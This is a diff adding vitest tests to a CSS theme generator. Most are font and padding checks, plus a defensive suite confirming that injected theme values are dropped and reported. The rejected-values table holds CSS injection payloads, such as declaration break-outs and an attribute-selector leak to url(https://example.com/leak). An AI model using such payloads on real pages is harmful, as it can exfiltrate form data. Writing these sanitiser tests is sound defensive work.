@@ -6,7 +6,7 @@
  * correct, consistently ordered CSS for both runtime and build paths.
  */
 
-import {describe, it, expect} from 'vitest';
+import {describe, it, expect, vi} from 'vitest';
 import {
   dataTokenDefaults,
   defineTheme,
@@ -14,6 +14,7 @@ import {
   generateThemeCSS,
   generateOnMediaCSS,
   generateThemeRules,
+  type DefinedTheme,
 } from './index';
 import {generateDataTokenDefaultsCSS} from './generateThemeRules';
 
@@ -274,6 +275,38 @@ describe('generateThemeRules', () => {
     expect(rules.some(r => r.includes(':where(small)'))).toBe(true);
     expect(rules.some(r => r.includes(':where(code, pre)'))).toBe(true);
     expect(rules.some(r => r.includes(':where(hr)'))).toBe(true);
+  });
+
+  it('applies the theme body font to the scope root', () => {
+    // Components styled with `font-family: inherit` (SideNav items, Buttons)
+    // resolve against this; without it they fall back to the browser default
+    // serif since nothing else sets a page font.
+    const fontTheme = defineTheme({
+      name: 'with-body-font',
+      typography: {body: {family: 'Figtree', fallbacks: 'sans-serif'}},
+      tokens: {},
+      components: {},
+    });
+    const fontRules = generateThemeRules(fontTheme);
+    const fontRule = fontRules.find(
+      r =>
+        r.includes(':scope') &&
+        r.includes('font-family: var(--font-family-body)'),
+    );
+    expect(fontRule).toBeDefined();
+    expect(fontRule).toBe(
+      '  :scope {\n    font-family: var(--font-family-body);\n  }',
+    );
+  });
+
+  it('emits no scope font rule when the theme declares no body font', () => {
+    // A bare theme contributes no scope rules of its own.
+    const fontRule = rules.find(
+      r =>
+        r.includes(':scope') &&
+        r.includes('font-family: var(--font-family-body)'),
+    );
+    expect(fontRule).toBeUndefined();
   });
 
   // --- Prop-level color overrides ---
@@ -924,6 +957,33 @@ describe('derived var expansion', () => {
     expect(rule).toContain('--_dropdown-menu-padding: 8px');
   });
 
+  it('emits paddingInline AND internal inset var for item', () => {
+    // The inset var is what keeps List's isFullBleed cancel in sync with a
+    // themed row padding — the padding override alone would move the text
+    // while the cancel keeps the default width.
+    const theme = defineTheme({
+      name: 'test-derived-item',
+      components: {
+        item: {
+          base: {paddingInline: 'var(--spacing-3)'},
+          'density:spacious': {paddingInline: 'var(--spacing-4)'},
+        },
+      },
+    });
+    const rules = generateThemeRules(theme);
+    const baseRule = rules.find(
+      r => r.includes('.astryx-item ') || r.includes('.astryx-item {'),
+    );
+    expect(baseRule).toBeDefined();
+    expect(baseRule).toContain('padding-inline: var(--spacing-3)');
+    expect(baseRule).toContain('--_item-inset-inline: var(--spacing-3)');
+    const spaciousRule = rules.find(r =>
+      r.includes('.astryx-item[data-density="spacious"]'),
+    );
+    expect(spaciousRule).toBeDefined();
+    expect(spaciousRule).toContain('--_item-inset-inline: var(--spacing-4)');
+  });
+
   it('emits internal vars for chat composer', () => {
     const theme = defineTheme({
       name: 'test-derived-chat',
@@ -1355,5 +1415,470 @@ describe('data visualization tokens', () => {
     expect(
       Object.keys(generateThemeCSS(defineTheme({name: 'data-shape'}))).sort(),
     ).toEqual(['component', 'prose']);
+  });
+});
+
+describe('declaration assembly keeps values as values', () => {
+  /** Run the full runtime generator, collecting every dropped declaration. */
+  function generate(theme: DefinedTheme) {
+    const diagnostics: string[] = [];
+    const {component, prose} = generateThemeCSS(theme, diagnostics);
+    return {css: component + prose, component, prose, diagnostics};
+  }
+
+  /**
+   * Every path a consumer-supplied declaration can take into the stylesheet.
+   * `build` places `value` on that path; `emitted` is the exact declaration
+   * text the path writes for it; `property`/`location` are what a diagnostic
+   * for it must carry.
+   */
+  const paths: {
+    label: string;
+    property: string;
+    location: string;
+    build: (value: string) => DefinedTheme;
+    emitted: (value: string) => string;
+  }[] = [
+    {
+      label: 'root tokens',
+      property: '--color-accent',
+      location: 'tokens',
+      build: value =>
+        defineTheme({name: 'brand', tokens: {'--color-accent': value}}),
+      emitted: value => `--color-accent: ${value};`,
+    },
+    {
+      label: 'theme-local tokens',
+      property: '--brand-accent',
+      location: 'localTokens',
+      build: value =>
+        defineTheme({name: 'brand', localTokens: {'--brand-accent': value}}),
+      emitted: value => `--brand-accent: ${value};`,
+    },
+    {
+      label: 'tokens inherited from a base theme',
+      property: '--color-accent',
+      location: 'tokens',
+      build: value =>
+        defineTheme({
+          name: 'child',
+          extends: defineTheme({
+            name: 'base',
+            tokens: {'--color-accent': value},
+          }),
+        }),
+      emitted: value => `--color-accent: ${value};`,
+    },
+    {
+      label: 'component variant',
+      property: 'background-color',
+      location: 'components.button["variant:secondary"]',
+      build: value =>
+        defineTheme({
+          name: 'brand',
+          components: {
+            button: {'variant:secondary': {backgroundColor: value}},
+          },
+        }),
+      emitted: value => `background-color: ${value};`,
+    },
+    {
+      label: 'component variant inherited from a base theme',
+      property: 'background-color',
+      location: 'components.button["variant:secondary"]',
+      build: value =>
+        defineTheme({
+          name: 'child',
+          extends: defineTheme({
+            name: 'base',
+            components: {
+              button: {'variant:secondary': {backgroundColor: value}},
+            },
+          }),
+        }),
+      emitted: value => `background-color: ${value};`,
+    },
+    {
+      label: 'component pseudo block',
+      property: 'background-color',
+      location: 'components.button["variant:secondary"][":hover"]',
+      build: value =>
+        defineTheme({
+          name: 'brand',
+          components: {
+            button: {'variant:secondary': {':hover': {backgroundColor: value}}},
+          },
+        }),
+      emitted: value => `background-color: ${value};`,
+    },
+    {
+      label: 'onDark tokens',
+      property: '--color-accent',
+      location: 'onDark.tokens',
+      build: value =>
+        defineTheme({
+          name: 'brand',
+          onDark: {tokens: {'--color-accent': value}},
+        }),
+      emitted: value => `--color-accent: ${value};`,
+    },
+    {
+      label: 'onLight component variant',
+      property: 'background-color',
+      location: 'onLight.components.button["variant:secondary"]',
+      build: value =>
+        defineTheme({
+          name: 'brand',
+          onLight: {
+            components: {
+              button: {'variant:secondary': {backgroundColor: value}},
+            },
+          },
+        }),
+      emitted: value => `background-color: ${value};`,
+    },
+    {
+      label: 'onDark component pseudo block',
+      property: 'background-color',
+      location: 'onDark.components.button["variant:secondary"][":hover"]',
+      build: value =>
+        defineTheme({
+          name: 'brand',
+          onDark: {
+            components: {
+              button: {
+                'variant:secondary': {':hover': {backgroundColor: value}},
+              },
+            },
+          },
+        }),
+      emitted: value => `background-color: ${value};`,
+    },
+    {
+      label: 'adaptation tokens',
+      property: '--color-accent',
+      location: 'adaptations[0].tokens',
+      build: value =>
+        defineTheme({
+          name: 'brand',
+          adaptations: {
+            rules: [
+              {
+                when: {pointer: 'coarse'},
+                value: {tokens: {'--color-accent': value}},
+              },
+            ],
+          },
+        }),
+      emitted: value => `--color-accent: ${value};`,
+    },
+    {
+      label: 'adaptation component variant',
+      property: 'background-color',
+      location: 'adaptations[1].components.button["variant:secondary"]',
+      build: value =>
+        defineTheme({
+          name: 'brand',
+          adaptations: {
+            rules: [
+              {
+                when: {pointer: 'fine'},
+                value: {tokens: {'--spacing-4': '12px'}},
+              },
+              {
+                when: {pointer: 'coarse'},
+                value: {
+                  components: {
+                    button: {'variant:secondary': {backgroundColor: value}},
+                  },
+                },
+              },
+            ],
+          },
+        }),
+      emitted: value => `background-color: ${value};`,
+    },
+  ];
+
+  /** Valid CSS a browser keeps inside one declaration. */
+  const preserved: [string, string][] = [
+    ['a color-mix()', 'color-mix(in oklch, #FF00FF 80%, white)'],
+    ['a gradient', 'linear-gradient(135deg, #FF00FF 0%, #00FFFF 100%)'],
+    ['calc()', 'calc(100% - 24px)'],
+    ['light-dark()', 'light-dark(#fff, #111)'],
+    ['a quoted font stack', "'Inter Var', ui-sans-serif, system-ui"],
+    [
+      'a data: URI (semicolon inside url())',
+      'url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==)',
+    ],
+    ['an uppercase URL()', 'URL(data:image/svg+xml;base64,PHN2Zz4=)'],
+    [
+      'a quoted url() carrying a semicolon',
+      'url("data:image/svg+xml;utf8,<svg/>")',
+    ],
+    ['an escaped identifier', 'Gill\\ Sans, serif'],
+    ['a closed comment with a semicolon inside', 'red /* ; } */'],
+    ['a semicolon inside a string', '"a;b"'],
+    ['an escaped quote inside a string', '"a\\" ; b"'],
+    ['quoted braces', '"} body { color: red }"'],
+    ['important', 'red !important'],
+    ['nested functions', 'var(--fallback, calc(1px + 2px))'],
+    ['CRLF string continuation', '"a\\\r\nb"'],
+    ['closed comment with a control character', 'red /* \u0001 ; } */'],
+    [
+      'balanced brackets and parentheses',
+      '[full-start] minmax(0, 1fr) [full-end]',
+    ],
+  ];
+
+  /** Values a browser reads as the end of the declaration or rule. */
+  const rejected: [string, string, string][] = [
+    [
+      'an unquoted semicolon adds a declaration',
+      'red; background-image: url(https://example.com/leak)',
+      ';',
+    ],
+    [
+      'an unquoted brace closes the rule',
+      'red } input[value^="a"] { background: url(https://example.com/leak?a) ',
+      '}',
+    ],
+    [
+      'an unquoted brace opens a block',
+      'red { background: url(https://example.com/leak) }',
+      '{',
+    ],
+    [
+      'an escaped quote is not a string opener',
+      '\\"; background: url(https://example.com/leak); "',
+      ';',
+    ],
+    [
+      'an unclosed comment swallows the rule',
+      'red /* https://example.com/leak',
+      'comment',
+    ],
+    [
+      'an unclosed string swallows the rule',
+      '"https://example.com/leak',
+      'string',
+    ],
+    [
+      'an unclosed url() swallows the rule',
+      'url(https://example.com/leak',
+      'url(',
+    ],
+    [
+      'an unclosed paren swallows the rule',
+      'calc(1px + var(--example.com/leak)',
+      '(',
+    ],
+    [
+      'an unbalanced closer',
+      'red) ; background: url(https://example.com/leak)',
+      ')',
+    ],
+    ['a bad url', 'url(https://example.com/leak a)', 'bad url'],
+    [
+      'a trailing backslash escapes the terminator',
+      'https://example.com/leak\\',
+      'backslash',
+    ],
+  ];
+
+  describe.each(paths)('$label', path => {
+    it.each(preserved)('emits %s byte-identically', (_label, value) => {
+      const {css, diagnostics} = generate(path.build(value));
+      expect(css).toContain(path.emitted(value));
+      expect(diagnostics).toEqual([]);
+    });
+
+    it.each(rejected)('drops a value where %s', (_label, value, reason) => {
+      const {css, diagnostics} = generate(path.build(value));
+      expect(css).not.toContain('example.com');
+      expect(css).not.toContain('leak');
+      expect(diagnostics).toHaveLength(1);
+      expect(diagnostics[0]).toContain(`"${path.property}"`);
+      expect(diagnostics[0]).toContain(path.location);
+      expect(diagnostics[0]).toContain(reason);
+    });
+  });
+
+  it('keeps a vendor-prefixed property name', () => {
+    const {css, diagnostics} = generate(
+      defineTheme({
+        name: 'brand',
+        components: {
+          button: {
+            'variant:secondary': {
+              WebkitLineClamp: '2',
+              MozOsxFontSmoothing: 'grayscale',
+            },
+          },
+        },
+      }),
+    );
+    expect(css).toContain('-webkit-line-clamp: 2;');
+    expect(css).toContain('-moz-osx-font-smoothing: grayscale;');
+    expect(diagnostics).toEqual([]);
+  });
+
+  it('drops a property name that is not a property name', () => {
+    const {css, diagnostics} = generate(
+      defineTheme({
+        name: 'brand',
+        tokens: {
+          '--x:red} body{color:blue': 'red',
+        } as Record<string, string>,
+      }),
+    );
+    expect(css).not.toContain('body{color:blue');
+    expect(css).not.toContain('body {');
+    expect(diagnostics).toHaveLength(1);
+    expect(diagnostics[0]).toContain('"--x:red} body{color:blue" in tokens');
+    expect(diagnostics[0]).toContain('identifier');
+  });
+
+  it('keeps prose rules intact when a typed token carries a payload', () => {
+    // Prose rules reference the token through var(), so the payload never
+    // reaches them; the token block drops it and the :where(p) rule stays.
+    const {css, prose, diagnostics} = generate(
+      defineTheme({
+        name: 'brand',
+        tokens: {
+          '--text-body-size': '1rem; } body { background: url(x) ',
+        },
+      }),
+    );
+    expect(css).not.toContain('background: url(x)');
+    expect(css).not.toContain('body {');
+    expect(prose).toContain('font-size: var(--text-body-size);');
+    expect(diagnostics).toHaveLength(1);
+    expect(diagnostics[0]).toContain('"--text-body-size" in tokens');
+  });
+
+  it('falls back to the token weight when an authored Heading weight cannot stay a declaration', () => {
+    const payload = '700; } body { background: url(https://example.com/leak) ';
+    const {css, diagnostics} = generate(
+      defineTheme({
+        name: 'brand',
+        components: {heading: {'weight:bold': {fontWeight: payload}}},
+      }),
+    );
+    expect(css).not.toContain('example.com');
+    expect(css).toContain(
+      '.astryx-heading[data-weight="bold"] { font-weight: var(--font-weight-bold); }',
+    );
+    // Reported once, where the authored rule's own declarations are emitted.
+    expect(diagnostics).toHaveLength(1);
+    expect(diagnostics[0]).toContain(
+      '"font-weight" in components.heading["weight:bold"]',
+    );
+  });
+
+  it('falls back to the token weight when an inherited Heading weight cannot stay a declaration', () => {
+    const payload = '700; } body { background: url(https://example.com/leak) ';
+    const {css} = generate(
+      defineTheme({
+        name: 'brand',
+        components: {heading: {'weight:bold': {fontWeight: payload}}},
+        onDark: {components: {heading: {'level:1': {fontSize: '2rem'}}}},
+      }),
+    );
+    expect(css).not.toContain('example.com');
+    expect(css).toContain(
+      ':is([data-astryx-media="dark"]) :is(.astryx-heading[data-weight="bold"]) { font-weight: var(--font-weight-bold); }',
+    );
+  });
+
+  it('a dropped container padding still leaves the rest of the rule intact', () => {
+    const {css, diagnostics} = generate(
+      defineTheme({
+        name: 'brand',
+        components: {
+          card: {
+            base: {
+              padding:
+                '16px; } body { background: url(https://example.com/leak) ',
+              borderRadius: '8px',
+            },
+          },
+        },
+      }),
+    );
+    expect(css).not.toContain('example.com');
+    expect(css).toContain('border-radius: 8px;');
+    expect(diagnostics).toHaveLength(1);
+    expect(diagnostics[0]).toContain('"padding" in components.card["base"]');
+    expect(css).not.toContain('--astryx-card-padding');
+  });
+
+  it('warns on the console only when no warning collector is given', () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        '--color-accent': 'red; background: url(https://example.com/leak)',
+      },
+    });
+
+    const plainCSS = generateThemeCSS(theme);
+    expect(warn).toHaveBeenCalledTimes(1);
+    expect(warn).toHaveBeenCalledWith(
+      expect.stringContaining(
+        '[astryx theme] dropped "--color-accent" in tokens',
+      ),
+    );
+
+    warn.mockClear();
+    const diagnostics: string[] = ['earlier build warning'];
+    const before = JSON.stringify(theme);
+    expect(generateThemeCSS(theme, diagnostics)).toEqual(plainCSS);
+    expect(JSON.stringify(theme)).toBe(before);
+    expect(warn).not.toHaveBeenCalled();
+    expect(diagnostics).toHaveLength(2);
+    expect(diagnostics[0]).toBe('earlier build warning');
+    expect(diagnostics[1]).toContain('dropped "--color-accent" in tokens');
+    warn.mockRestore();
+  });
+
+  it('every shipped generator entry point appends to the warning collector', () => {
+    const theme = defineTheme({
+      name: 'brand',
+      tokens: {
+        '--color-accent': 'red; background: url(https://example.com/leak)',
+      },
+      onDark: {
+        tokens: {
+          '--color-accent': 'red; background: url(https://example.com/dark)',
+        },
+      },
+      adaptations: {
+        rules: [
+          {
+            when: {pointer: 'coarse'},
+            value: {
+              tokens: {
+                '--color-accent':
+                  'red; background: url(https://example.com/coarse)',
+              },
+            },
+          },
+        ],
+      },
+    });
+    const seen: string[] = [];
+    expect(generateThemeRules(theme, seen).join('')).not.toContain(
+      'example.com',
+    );
+    expect(generateOnMediaCSS(theme, seen)).not.toContain('example.com');
+    expect(generateAdaptationCSS(theme, seen).component).not.toContain(
+      'example.com',
+    );
+    expect(seen).toEqual([
+      expect.stringContaining('in tokens:'),
+      expect.stringContaining('in onDark.tokens:'),
+      expect.stringContaining('in adaptations[0].tokens:'),
+    ]);
   });
 });
